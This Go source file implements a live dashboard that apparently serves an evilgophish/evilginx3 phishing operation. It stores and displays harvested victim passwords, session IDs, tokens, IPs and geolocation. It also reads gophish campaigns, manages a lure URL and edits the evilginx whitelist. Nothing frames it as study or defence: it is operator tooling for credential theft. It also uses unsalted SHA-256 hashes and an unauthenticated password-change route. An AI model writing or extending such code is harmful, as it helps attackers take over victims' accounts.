package main

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	_ "github.com/mattn/go-sqlite3"
)

var db *sql.DB

// Auth & Captcha Stores
var (
	captchaStore = make(map[string]int)
	captchaMutex sync.RWMutex
	sessionStore = make(map[string]bool)
	sessionMutex sync.RWMutex
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
	CheckOrigin: func(r *http.Request) bool {
		return true // Allow all origins
	},
}

const (
	writeWait      = 300 * time.Second
	pongWait       = 300 * time.Second
	pingPeriod     = (pongWait * 9) / 10
	maxMessageSize = 1000000
)

var (
	newline = []byte{'\n'}
	space   = []byte{' '}
)

// --- WebSocket Client ---

func (c *Client) writePump() {
	ticker := time.NewTicker(pingPeriod)
	defer func() {
		ticker.Stop()
		c.conn.Close()
	}()
	for {
		select {
		case message, ok := <-c.send:
			c.conn.SetWriteDeadline(time.Now().Add(writeWait))
			if !ok {
				c.conn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}

			w, err := c.conn.NextWriter(websocket.TextMessage)
			if err != nil {
				return
			}
			w.Write(message)

			n := len(c.send)
			for i := 0; i < n; i++ {
				w.Write(newline)
				w.Write(<-c.send)
			}

			if err := w.Close(); err != nil {
				return
			}
		case <-ticker.C:
			c.conn.SetWriteDeadline(time.Now().Add(writeWait))
			if err := c.conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		}
	}
}

func (c *Client) readPump() {
	defer func() {
		c.hub.unregister <- c
		c.conn.Close()
	}()
	c.conn.SetReadLimit(maxMessageSize)
	c.conn.SetReadDeadline(time.Now().Add(pongWait))
	c.conn.SetPongHandler(func(string) error { c.conn.SetReadDeadline(time.Now().Add(pongWait)); return nil })
	for {
		_, message, err := c.conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("error: %v", err)
			}
			break
		}
		message = bytes.TrimSpace(bytes.Replace(message, newline, space, -1))
		saveEvent(message)
		c.hub.broadcast <- message
	}
}

func serveWs(hub *Hub, w http.ResponseWriter, r *http.Request) {
	// Check auth for WS too
	cookie, err := r.Cookie("session_token")
	if err != nil || !isValidSession(cookie.Value) {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	c, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Print("upgrade:", err)
		return
	}
	client := &Client{hub: hub, conn: c, send: make(chan []byte, 256)}
	client.hub.register <- client

	go client.writePump()
	go client.readPump()
}

// --- Data Models ---

type GeoInfo struct {
	City    string  `json:"city"`
	Country string  `json:"country"`
	Lat     float64 `json:"lat"`
	Lon     float64 `json:"lon"`
}

type Event struct {
	ID        int64   `json:"id"`
	Timestamp int64   `json:"timestamp"`
	Type      string  `json:"type"`
	Phishlet  string  `json:"phishlet"`
	IP        string  `json:"ip"`
	Username  string  `json:"username,omitempty"`
	Password  string  `json:"password,omitempty"`
	SessionID string  `json:"session_id,omitempty"`
	Tokens    string  `json:"tokens,omitempty"`
	Geo       GeoInfo `json:"geo,omitempty"`
	Score     int     `json:"score,omitempty"`
	Message   string  `json:"message,omitempty"`
}

// --- Database & Auth ---

func initDB() {
	home, _ := os.UserHomeDir()
	dbPath := filepath.Join(home, ".evilgophish", "nexusfeed.db")
	os.MkdirAll(filepath.Dir(dbPath), 0755)

	var err error
	db, err = sql.Open("sqlite3", dbPath)
	if err != nil {
		log.Fatal(err)
	}

	_, err = db.Exec(`
		CREATE TABLE IF NOT EXISTS events (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			timestamp INTEGER,
			type TEXT,
			phishlet TEXT,
			ip TEXT,
			username TEXT,
			password TEXT,
			session_id TEXT,
			tokens TEXT,
			geo_city TEXT,
			geo_country TEXT,
			geo_lat REAL,
			geo_lon REAL,
			score INTEGER,
			message TEXT
		);
		CREATE TABLE IF NOT EXISTS admin (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			password_hash TEXT,
			must_reset INTEGER
		);
		CREATE TABLE IF NOT EXISTS settings (
			key TEXT PRIMARY KEY,
			value TEXT
		);
	`)
	if err != nil {
		log.Fatal(err)
	}
}

func initAuth() {
	var count int
	err := db.QueryRow("SELECT COUNT(*) FROM admin").Scan(&count)
	if err != nil {
		log.Fatal(err)
	}

	if count == 0 {
		// Generate initial password
		password := generateRandomString(12)
		hash := hashPassword(password)

		_, err := db.Exec("INSERT INTO admin (password_hash, must_reset) VALUES (?, 1)", hash)
		if err != nil {
			log.Fatal(err)
		}

		fmt.Println("\n[+] ================================================== [+]")
		fmt.Println("[+] Initial Admin Password Generated: " + password)
		fmt.Println("[+] Please login and change this password immediately.")
		fmt.Println("[+] ================================================== [+]\n")
	}
}

func generateRandomString(n int) string {
	const letters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
	ret := make([]byte, n)
	for i := 0; i < n; i++ {
		num, err := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
		if err != nil {
			return ""
		}
		ret[i] = letters[num.Int64()]
	}
	return string(ret)
}

func hashPassword(password string) string {
	hash := sha256.Sum256([]byte(password))
	return hex.EncodeToString(hash[:])
}

func isValidSession(token string) bool {
	sessionMutex.RLock()
	defer sessionMutex.RUnlock()
	return sessionStore[token]
}

// --- Handlers ---

func saveEvent(msg []byte) {
	var e Event
	if err := json.Unmarshal(msg, &e); err != nil {
		log.Println("Error unmarshalling event:", err)
		return
	}
	if e.Timestamp == 0 {
		e.Timestamp = time.Now().UnixMilli()
	}
	_, err := db.Exec(`
		INSERT INTO events (timestamp, type, phishlet, ip, username, password, session_id, tokens, geo_city, geo_country, geo_lat, geo_lon, score, message)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
		e.Timestamp, e.Type, e.Phishlet, e.IP, e.Username, e.Password, e.SessionID, e.Tokens,
		e.Geo.City, e.Geo.Country, e.Geo.Lat, e.Geo.Lon, e.Score, e.Message,
	)
	if err != nil {
		log.Println("DB save error:", err)
	}
}

func authMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		cookie, err := r.Cookie("session_token")
		if err != nil || !isValidSession(cookie.Value) {
			if r.Header.Get("Content-Type") == "application/json" {
				http.Error(w, "Unauthorized", http.StatusUnauthorized)
			} else {
				http.Redirect(w, r, "/login", http.StatusFound)
			}
			return
		}
		next(w, r)
	}
}

func loginPageHandler(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "./app/login.html")
}

func indexHandler(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie("session_token")
	if err != nil || !isValidSession(cookie.Value) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}
	http.ServeFile(w, r, "./app/index.html")
}

func captchaHandler(w http.ResponseWriter, r *http.Request) {
	n1, _ := rand.Int(rand.Reader, big.NewInt(10))
	n2, _ := rand.Int(rand.Reader, big.NewInt(10))
	num1 := int(n1.Int64()) + 1
	num2 := int(n2.Int64()) + 1

	id := generateRandomString(16)

	captchaMutex.Lock()
	captchaStore[id] = num1 + num2
	captchaMutex.Unlock()

	// Cleanup old captchas periodically (simplified: just don't for now, or use a ticker in main)

	json.NewEncoder(w).Encode(map[string]string{
		"id":       id,
		"question": fmt.Sprintf("%d + %d", num1, num2),
	})
}

func verifyCaptchaHandler(w http.ResponseWriter, r *http.Request) {
	var req struct {
		CaptchaID     string `json:"captcha_id"`
		CaptchaAnswer int    `json:"captcha_answer"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	captchaMutex.RLock()
	expected, ok := captchaStore[req.CaptchaID]
	captchaMutex.RUnlock()

	if !ok || expected != req.CaptchaAnswer {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "Incorrect captcha"})
		return
	}

	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func loginAPIHandler(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Password      string `json:"password"`
		CaptchaID     string `json:"captcha_id"`
		CaptchaAnswer int    `json:"captcha_answer"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	// Verify Captcha
	captchaMutex.RLock()
	expected, ok := captchaStore[req.CaptchaID]
	captchaMutex.RUnlock()

	if !ok || expected != req.CaptchaAnswer {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "Incorrect captcha"})
		return
	}

	// Clean up used captcha
	captchaMutex.Lock()
	delete(captchaStore, req.CaptchaID)
	captchaMutex.Unlock()

	// Verify Password
	var hash string
	var mustReset int
	err := db.QueryRow("SELECT password_hash, must_reset FROM admin LIMIT 1").Scan(&hash, &mustReset)
	if err != nil {
		http.Error(w, "Server error", http.StatusInternalServerError)
		return
	}

	if hashPassword(req.Password) != hash {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "Invalid password"})
		return
	}

	if mustReset == 1 {
		json.NewEncoder(w).Encode(map[string]string{"status": "reset_required"})
		return
	}

	// Create Session
	token := generateRandomString(32)
	sessionMutex.Lock()
	sessionStore[token] = true
	sessionMutex.Unlock()

	http.SetCookie(w, &http.Cookie{
		Name:     "session_token",
		Value:    token,
		Path:     "/",
		HttpOnly: true,
		Expires:  time.Now().Add(24 * time.Hour),
	})

	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func changePasswordHandler(w http.ResponseWriter, r *http.Request) {
	var req struct {
		CurrentPassword string `json:"current_password"`
		NewPassword     string `json:"new_password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	var hash string
	err := db.QueryRow("SELECT password_hash FROM admin LIMIT 1").Scan(&hash)
	if err != nil {
		http.Error(w, "Server error", http.StatusInternalServerError)
		return
	}

	if hashPassword(req.CurrentPassword) != hash {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "Invalid current password"})
		return
	}

	newHash := hashPassword(req.NewPassword)
	_, err = db.Exec("UPDATE admin SET password_hash = ?, must_reset = 0", newHash)
	if err != nil {
		http.Error(w, "Database error", http.StatusInternalServerError)
		return
	}

	// Create Session
	token := generateRandomString(32)
	sessionMutex.Lock()
	sessionStore[token] = true
	sessionMutex.Unlock()

	http.SetCookie(w, &http.Cookie{
		Name:     "session_token",
		Value:    token,
		Path:     "/",
		HttpOnly: true,
		Expires:  time.Now().Add(24 * time.Hour),
	})

	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// --- Existing Handlers (Wrapped) ---

func getEventsJSON(w http.ResponseWriter, r *http.Request) {
	rows, err := db.Query("SELECT * FROM events ORDER BY timestamp DESC LIMIT 500")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	var events []Event
	for rows.Next() {
		var e Event
		err := rows.Scan(&e.ID, &e.Timestamp, &e.Type, &e.Phishlet, &e.IP, &e.Username, &e.Password, &e.SessionID, &e.Tokens,
			&e.Geo.City, &e.Geo.Country, &e.Geo.Lat, &e.Geo.Lon, &e.Score, &e.Message)
		if err != nil {
			continue
		}
		events = append(events, e)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(events)
}

func getVisitors(w http.ResponseWriter, r *http.Request) {
	rows, err := db.Query("SELECT * FROM events WHERE type IN ('open', 'click') ORDER BY timestamp DESC LIMIT 500")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	var events []Event
	for rows.Next() {
		var e Event
		err := rows.Scan(&e.ID, &e.Timestamp, &e.Type, &e.Phishlet, &e.IP, &e.Username, &e.Password, &e.SessionID, &e.Tokens,
			&e.Geo.City, &e.Geo.Country, &e.Geo.Lat, &e.Geo.Lon, &e.Score, &e.Message)
		if err != nil {
			continue
		}
		events = append(events, e)
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(events)
}

func getCredentials(w http.ResponseWriter, r *http.Request) {
	rows, err := db.Query("SELECT * FROM events WHERE type IN ('credentials', 'session') ORDER BY timestamp DESC LIMIT 500")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	var events []Event
	for rows.Next() {
		var e Event
		err := rows.Scan(&e.ID, &e.Timestamp, &e.Type, &e.Phishlet, &e.IP, &e.Username, &e.Password, &e.SessionID, &e.Tokens,
			&e.Geo.City, &e.Geo.Country, &e.Geo.Lat, &e.Geo.Lon, &e.Score, &e.Message)
		if err != nil {
			continue
		}
		events = append(events, e)
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(events)
}

func getCampaigns(w http.ResponseWriter, r *http.Request) {
	home, _ := os.UserHomeDir()
	gophishDBPath := filepath.Join(home, "Documents", "projects", "evilgophish", "gophish", "gophish.db")
	if _, err := os.Stat(gophishDBPath); os.IsNotExist(err) {
		gophishDBPath = "../gophish/gophish.db"
	}

	gpDB, err := sql.Open("sqlite3", gophishDBPath)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte("[]"))
		return
	}
	defer gpDB.Close()

	rows, err := gpDB.Query("SELECT id, name, status, created_date FROM campaigns ORDER BY created_date DESC")
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte("[]"))
		return
	}
	defer rows.Close()

	type Campaign struct {
		ID      int64  `json:"id"`
		Name    string `json:"name"`
		Status  string `json:"status"`
		Created string `json:"created_date"`
	}
	var campaigns []Campaign
	for rows.Next() {
		var c Campaign
		var created interface{}
		rows.Scan(&c.ID, &c.Name, &c.Status, &created)
		if t, ok := created.(time.Time); ok {
			c.Created = t.Format(time.RFC3339)
		} else if s, ok := created.(string); ok {
			c.Created = s
		}
		campaigns = append(campaigns, c)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(campaigns)
}

func handleSettings(w http.ResponseWriter, r *http.Request) {
	var lureURL string
	err := db.QueryRow("SELECT value FROM settings WHERE key = 'lure_url'").Scan(&lureURL)
	if err != nil {
		lureURL = "Contact admin for your link"
	}

	settings := map[string]string{
		"telegram_webhook": "Not configured (Edit config.json)",
		"lure_url":         lureURL,
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(settings)
}

func handleInternalSettings(w http.ResponseWriter, r *http.Request) {
	// Only allow localhost
	host, _, _ := net.SplitHostPort(r.RemoteAddr)
	if host != "127.0.0.1" && host != "::1" {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	if r.Method == "POST" {
		var req struct {
			LureURL string `json:"lure_url"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "Invalid request", http.StatusBadRequest)
			return
		}

		_, err := db.Exec("INSERT OR REPLACE INTO settings (key, value) VALUES ('lure_url', ?)", req.LureURL)
		if err != nil {
			http.Error(w, "Database error", http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusOK)
	}
}

func handleWhitelist(w http.ResponseWriter, r *http.Request) {
	whitelistPath := "../evilginx3/whitelist.txt"
	if r.Method == "POST" {
		var req struct {
			IP string `json:"ip"`
		}
		json.NewDecoder(r.Body).Decode(&req)
		if req.IP != "" {
			f, err := os.OpenFile(whitelistPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
			if err == nil {
				defer f.Close()
				f.WriteString(req.IP + "\n")
			}
		}
	}

	content, err := os.ReadFile(whitelistPath)
	ips := []string{}
	if err == nil {
		// Simple split, in real app use bufio.Scanner
		ips = append(ips, string(content))
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(ips)
}

func clearLogs(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		_, err := db.Exec("DELETE FROM events")
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusOK)
	}
}

func main() {
	initDB()
	initAuth()
	hub := newHub()
	go hub.run()

	// Static files
	http.Handle("/app/", http.StripPrefix("/app/", http.FileServer(http.Dir("./app"))))

	// Public Routes
	http.HandleFunc("/login", loginPageHandler)
	http.HandleFunc("/api/login", loginAPIHandler)
	http.HandleFunc("/api/captcha", captchaHandler)
	http.HandleFunc("/api/verify-captcha", verifyCaptchaHandler)
	http.HandleFunc("/api/change-password", changePasswordHandler)

	// Protected Routes
	http.HandleFunc("/", indexHandler)
	http.HandleFunc("/events", authMiddleware(getEventsJSON))
	http.HandleFunc("/api/visitors", authMiddleware(getVisitors))
	http.HandleFunc("/api/credentials", authMiddleware(getCredentials))
	http.HandleFunc("/api/campaigns", authMiddleware(getCampaigns))
	http.HandleFunc("/api/settings", authMiddleware(handleSettings))
	http.HandleFunc("/api/internal/settings", handleInternalSettings)
	http.HandleFunc("/api/whitelist", authMiddleware(handleWhitelist))
	http.HandleFunc("/api/logs/clear", authMiddleware(clearLogs))

	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		serveWs(hub, w, r)
	})

	log.Println("Start viewing the live feed at: http://0.0.0.0:1337/")
	http.ListenAndServe(":1337", nil)
}
